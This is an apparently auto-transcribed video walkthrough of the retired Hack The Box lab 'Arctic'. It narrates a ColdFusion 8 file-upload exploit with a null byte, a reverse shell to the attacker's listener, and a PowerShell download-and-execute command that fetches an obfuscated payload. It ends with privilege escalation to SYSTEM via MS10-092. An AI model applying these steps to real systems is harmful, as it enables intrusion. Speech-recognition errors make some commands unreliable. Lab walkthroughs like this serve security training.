 hey guys good news Hector Box EU has retired Arctic so I get to publish a walkthrough on it so first things first we will have to nmap the box to identify any open ports so that's n map SV enumerate versions SC run safe scripts Oh a I'll put all formats name that n map and the IP address of the box which is 10 10 10 11 not going to run it because it takes time I have the results saved and we can see it's listening on three ports both 1 3 5 & a 49,000 is microsoft windows remote procedural call 8500 and that doesn't know exactly so let's go to this and see what is returned so 1010 1011 8500 and this takes about 20 to 30 seconds every single request which is a pain maybe that's why it's named Arctic because it's so slow the other reason is we'll find out later it's running an application called cold fusion if you didn't see over here and the pages that show us this cache so we don't have to click this every single time 8500 returns a directory listing CF IDE and CF Docs I right click both open a new tab the IDE 1 has a folder code administrator which is interesting and going to that should reveal a page if it fully loads correctly that says ColdFusion 8 so maybe when they come back to that it will I just want to wait the 20 to 30 seconds so we know it's running ColdFusion 8 so let's do search boys on cold fusion and we see a lot the first thing that jumps out is all these on 8 but they all look like cross-site scripting not the most interesting when you look at this one that has file upload and it's a Metasploit module file uploads interesting on web servers because if you upload a script and then navigate to it it can execute said script and you get code execution so let's load Metasploit MSF console rename my window to MSF and once this Toad's we will look for the ColdFusion module and this one looks like it is the thing we saw in search point file upload so copy this request use this and then show the options set the our host to 1010 1011 set our port to 8500 and then let it run we see it started or reverse TCP Handler and ten ten twelve one ninety four point four four four four which is my box and then almost immediately fails there's no way it can no this request failed so quickly because it takes like 30 seconds for everything to return we go back we do see it did little ColdFusion 8 but no way this exploit fails that quickly so let's do show Advanced Options set verbose to true so we can see what's going on run the script and we don't see any more information I was hoping we'd see a post request and the server's response we don't so I guess the verbose option wasn't coded in the script we could send this to Burke and then see the requests and easy way to do that would probably be set the proxy variable here decided to like HTTP localhost 8080 but I'm going to do something slightly different because it may help you when you're running scripts that don't support proxies or they didn't go proxy support and the module so go over the book go to a proxy tab options add a new listener or bind this to port 80 500 to make it easy this could be anything and will redirect this to 10 10 10 11 and put 8500 set this to ok we see it is running and then go to a web browser and go to localhost 8500 and what this is doing is it's saying well when it's on 8080 we don't see a redirect it's a dynamic proxy which means applications going to connect to burp and tell burp where to go when we sell it to redirect we're killing that dynamic portion so every time we connect to this socket it's going to send us to this location and we see localhost 8500 so now in but we can go to intercept turn this on go to terminal set our host to one 2700 one localhost and run this again and now we go to boot and we okay see the request it's trying to make I'm not sure why it's show me that 404 but this is what I was expecting to see so we see let's just send this over to repeater and drop this and run the script and I'll explain exactly what's happening while this loads so we're making a post request to upload CSM ColdFusion module command file upload not important where the exploit comes in is this current folder KJ SP and then % 0 0 this is a hex encoded null byte which is a string terminator we see it finished here but anyways what ColdFusion is going to do is going to take this current folder and file name variable and combine the two to get the file location but when null byte is in middle of the string the string is going to terminate right here when explaining the file and there's no I guess extension check on current folder only found in and when it terminates right after this it uploads the file kay JSP file name could have been anything so when I copy this turn intercept off and before I do that let's go back into this and scroll down repeater we see it executing cmd.exe and sending it to 10 and twelve one ninety four point four four four four so open up a new window let's name this n cat and start a listener l-listen V verbose and don't do d NS p four four four four and then navigate to that page make sure Boop is not intercepting and then wait that 20 to 30 seconds for shell to return and it is painful to wait this long every single time so you can imagine why I wanted to debug this and burp when Metasploit returned a failure and like five seconds because there's no way it would know an exploit failed within five seconds when you make two requests and it takes like 30 seconds per request we see the file finished and we have a shell right here that is awesome unfortunately this is not meterpreter it's only a reverse shell so we're going to use a program called unicorn to make it very easy to load a shell so opted unicorn unicorn pie and we can see the instructions if you want to download this just Google Python unicorn trusted SEC and it's this github page so let's opt unicorn unicorn dot pie the usage payload so we want Windows meterpreter reverse tcp the IP address of a box so 10 10 12 190 for the port let's do a wheat generating the request and it will output two files when this is done the first file is unicorn RC which is all the commands to load the listener and Metasploit the other one is a file code powershell attack which if we copy and paste this command in it may return a shell the commands very long and I hate sending long commands through because they just don't like working so first things first let's go to a Metasploit we can close this out and then just do MSF consult our unicorn RC because that's what the program said to do and we see it's going to start Metasploit and then automatically start that wizna so processing the file run all the commands started reverse Handler on IP elite so what I'm going to do is send this to my clipboard create a new file exploit dot HTML it can be anything paste it I'm going to delete this double quote because I want to get rid of all this PowerShell and just run the PowerShell natively so get rid of this and what we're left with is a bunch of encrypted commands to evade antivirus because that's what unicorns default is so save this Python - M simple HTTP server so we have HTTP age rename this to HTTP I guess go back to a shell when we run PowerShell then double quotes ie X for invoke expressions I think it's invoke expression whatever new - object net dot web client dot download string and then the IP address of our string so HTTP 10 10 12 194 port 8000 exploit dot HTML close that off and what this does is it tells PowerShell hey go to this website and execute anything on that page it's about as bad as you think and what that's going to do is it goes to a page downloads the code executes it sends it to Metasploit lowe's motor pada simple so run that command we can go to HTTP thing and we'll see it hits this probably in ten seconds hopefully if not we may have goofed so now we see the website server requesting our exploit HTML we go to Metasploit and wait it should soon start sending the staged payload over to it there we go and come on get the shell so one has open so sessions - I won first thing first this info and we see the box is 64-bit I'm running in a 32-bit version of meterpreter that's fine for now is it get UID to see who I'm running as I'm running as the tallest user so chances are I can get that user flag right now but we're going to send this to the background and I'm going to search for something called local exploit suggester so search suggests and we're going to use this this is a post module so it's going to execute a script to that meterpreter session so show options set session 1 run this and what this does is it checks for all the KB's applied to that box and recommends exploits once this is done since the 64 bit box I like running this against a 64 bit version of interpreter because they return different things and then after both of these sometimes I run the PowerShell module called power up if I don't see anything and that looks at Prive esque through service misconfigurations mainly it doesn't really look that much at exploitation via no patches so we see it saying hey 37 exploit checks are going to be tried very first one appears to be vulnerable appears to be vulnerable and it's going to go through this have many times appear Z exploits vulnerable shouldn't take too much longer to go through the rest of them come on okay so let's create a new window and save this as exploits I guess so quick to Metasploit copy paste and now we want to go back sessions - i won run PS because we're going to switch to a 64-bit version of interpreter now very first thing I look at is I want to go to a process that has this x64 and a 1 here the 1 means it's interactive which gives us a few more permissions we don't see any of those so now we have to pick one of these x64 to migrate into we could do parish oesc but that may be bad because this process may die and when this dies or the temperature session dies this con host appears to be a much more stable one that may not end so quickly so let's copy that and migrate into it migrating from a pin to 5 9 2 to 1 1 to 0 and when this is done we'll run sis info again and verify 1 a 64-bit version of meterpreter so this info meterpreter 64 ok so background that show options make sure this is still session 1 and rerun this exploit suggester because it's probably going to show different exploits since it's a now checking against 64-bit ones come on load 14 exploits being checked and only returns 1 that appears to be vulnerable so for good practice let's go back save this into our notes and looking at this we see ms 1092 is vulnerable on both x86 and 64 so since that reported twice I'm going to try that one first so we're going to use use this which is another post module exploit show options so we want to set this to session one set Thresh it one run this and kill this out real quick because I saw studded reverse TCP Handler on 172 this is my local IP and that box doesn't know how to get to that we have to set it to a VPN to IP address so set L host to 10 10 12 194 and run this again so let's preparing the payload creating the task going to be sending this over and just wait patiently and get shell name link task executing and we see sending stage so it started sending meterpreter session right after this exploit and we opened a new session so I do get UID now I am anti-authority system which means I am now essentially route on this box I go into shell and then CD backslash users administrator it's on desktop and I could view this file and that is how you do Arctic I hope you guys have enjoyed this tutorial if you did feel free to subscribe and follow me on Twitter at hips AK take care guys